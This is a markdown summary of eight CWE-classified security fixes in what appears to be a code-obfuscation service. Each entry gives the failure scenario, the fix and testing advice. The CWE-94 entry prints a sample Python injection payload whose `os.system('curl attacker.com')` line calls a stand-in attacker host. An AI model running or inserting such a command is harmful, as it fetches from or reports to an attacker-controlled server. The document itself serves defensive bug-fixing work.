# CWE Security Fixes Summary

## Overview
This document summarizes the 8 security bugs fixed in this codebase, following Common Weakness Enumeration (CWE) best practices.

## Fixed Vulnerabilities

### 1. CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization
**File:** `src/server/services/rate-limit.service.ts:45-87`

**Issue:** Race condition in rate limiter's Map read-modify-write sequence allowed concurrent requests to bypass rate limits.

**Failure Scenario:** Two requests from same client arrive simultaneously, both read `count: 9`, increment to 10, both pass when limit is 10 requests/minute. The 11th should have been blocked.

**Fix:** 
- Check limit BEFORE incrementing count (atomic check-and-increment)
- Headers set during all code paths to prevent information leakage
- Proper ordering: read → check → reject OR increment

---

### 2. CWE-772: Missing Release of Resource after Effective Lifetime
**File:** `api/obfuscate.ts:16-67` and `api/simulate.ts:14-65`

**Issue:** Request timeout didn't abort data collection. `setTimeout` rejected promise but `req.on('data')` handler continued accumulating chunks indefinitely, causing memory leaks.

**Failure Scenario:** Attacker sends POST with `Content-Length: 50000`, transmits 1 byte/second. Timeout fires after 10s but data handler keeps running, memory grows unbounded.

**Fix:**
- Added `cleanup()` function that removes all event listeners
- Timeout now calls `cleanup()` before rejecting
- Wrapped resolve/reject to clear timeout on normal completion
- Tracks completion state to prevent double-handling

---

### 3. CWE-400: Uncontrolled Resource Consumption
**File:** `api/obfuscate.ts:16-67` and `api/simulate.ts:14-65`

**Issue:** No size limit on request body parsing. Only `obfuscate-secure.ts` had `MAX_BODY_SIZE` check.

**Failure Scenario:** Attacker sends 500 MB JSON body. Server accumulates entire body in memory, crashes with OOM.

**Fix:**
- Added `MAX_BODY_SIZE` constant (200 KB for obfuscate, 50 KB for simulate)
- Check `totalSize` on each data chunk
- Reject and cleanup immediately if limit exceeded
- Prevents memory exhaustion attacks

---

### 4. CWE-459: Incomplete Cleanup
**File:** `src/server/services/python-sandbox.service.ts:184-288`

**Issue:** Temporary file leaked when `spawn()` failed synchronously. The `finally` block only ran when Promise resolved via process handlers, not when spawn itself threw.

**Failure Scenario:** `writeFileSync` succeeds, then `spawn('python3', ...)` fails (python3 not in PATH). Error handler resolves promise but execution never reaches `finally` block. File `/tmp/pyvm_sandbox_*.py` remains on disk.

**Fix:**
- Added `scriptCreated` flag set after successful write
- Wrapped spawn in additional try-catch
- New catch block returns error result immediately
- `finally` block checks `scriptCreated` flag before cleanup
- Ensures cleanup happens even on synchronous spawn failures

---

### 5. CWE-94: Improper Control of Generation of Code
**File:** `src/server/services/lambda-ast-morpher.service.ts:29-301`

**Issue:** User source code passed to Python via stdin without validation. Malformed source with triple-quote breaks could escape heredoc and execute arbitrary Python during AST parsing.

**Failure Scenario:**
```python
x = 1
"""
import os; os.system('curl attacker.com')
"""
```
This closes stdin heredoc early, allowing injected code to run.

**Fix:**
- Added input validation: max length check (1MB)
- Pattern detection for injection attempts (triple-quote escapes, null bytes)
- Reject and fall back to original source if dangerous patterns detected
- Added comment noting PythonSandboxService would be proper solution
- Current fix prevents most injection while maintaining functionality

---

### 6. CWE-190: Integer Overflow or Wraparound
**File:** `src/server/services/entropy.service.ts:30-54`

**Issue:** Byte distribution calculation didn't validate input range. Values ≥ 256 caused incorrect bucket assignment.

**Failure Scenario:** Caller passes `number[]` array containing `300`. Calculation: `bucketIdx = Math.min(15, Math.floor(300 / 16)) = 15`. Value lands in `F0-FF` bucket but 300 is outside valid byte range, making entropy calculation meaningless.

**Fix:**
- Added `& 0xFF` mask to ensure byte is in valid range [0-255]
- Prevents out-of-range values from corrupting distribution
- Maintains correctness even with malformed input arrays

---

### 7. CWE-328: Use of Weak Hash
**Files:** 
- `src/server/services/rust-vm-generator.service.ts:105-124`
- Generated Python runtime code in same file

**Issue:** Witness tokens used weak rolling hash susceptible to birthday paradox collisions after ~2^16 attempts. Attacker could craft two different `(rawKey, magicHex)` pairs producing same `w1`, bypassing anti-switch protection.

**Failure Scenario:** For short inputs like `rawKey="A" + magicHex="7F50564D"`, 32-bit rolling hash has collision probability of 50% after ~65k attempts. Attacker finds collision, uses one pair's encrypted layer with another's decryption key.

**Fix (TypeScript):**
- Replaced `computeWitness` rolling hash with HMAC-SHA256
- Replaced `simulateCffWitness` arithmetic with PBKDF2-SHA256
- Returns hex strings instead of numbers for full hash strength
- Uses existing `SecureKeyDerivationService` functions

**Fix (Python Runtime):**
- Updated `calc_witness` to use `hmac.new()` with SHA256
- Updated CFF dispatcher to use `hashlib.pbkdf2_hmac()`
- Witness values now strings, converted to int only for token calculation
- Maintains compatibility with TypeScript-generated values

---

### 8. CWE-401: Missing Release of Memory after Effective Lifetime
**File:** `src/server/services/rate-limit.service.ts:20-43`

**Issue:** Rate limiter cleanup timer never fires in serverless environments. Modules cached across invocations but `setInterval` frozen between requests. Expired entries accumulated in `requestCounts` Map causing unbounded memory growth.

**Failure Scenario:** Vercel/serverless deployment caches module on first import. If first import happens in handler that throws early, `initialize()` never runs. Even when initialized, `setInterval` freezes after response, cleanup never fires between requests.

**Fix:**
- Added `unref()` call on timer to prevent blocking process exit
- Added `inlineCleanup()` method called on each request
- Inline cleanup only runs when Map size > 100 (performance optimization)
- Middleware now calls `inlineCleanup()` at start of each request
- Handles both long-running and serverless environments correctly

---

## Testing Recommendations

1. **Rate Limiter:** Test concurrent requests from same client, verify 11th request blocked when limit is 10
2. **Request Timeout:** Test slow-drip attacks, verify memory doesn't grow
3. **Body Size Limits:** Send 300 KB request to obfuscate endpoint, verify 400 error
4. **Temp File Cleanup:** Test sandbox with python3 missing from PATH, verify no leaked files
5. **AST Morpher:** Test source with triple-quote injection attempts, verify rejection
6. **Byte Distribution:** Pass `[255, 256, 300]` to entropy service, verify correct bucketing
7. **Witness Collision:** Generate 100k different inputs, verify no collisions in HMAC output
8. **Serverless Memory:** Deploy to Vercel, hammer with requests, verify Map size stays bounded

## References

- CWE-362: https://cwe.mitre.org/data/definitions/362.html
- CWE-772: https://cwe.mitre.org/data/definitions/772.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
- CWE-459: https://cwe.mitre.org/data/definitions/459.html
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- CWE-190: https://cwe.mitre.org/data/definitions/190.html
- CWE-328: https://cwe.mitre.org/data/definitions/328.html
- CWE-401: https://cwe.mitre.org/data/definitions/401.html
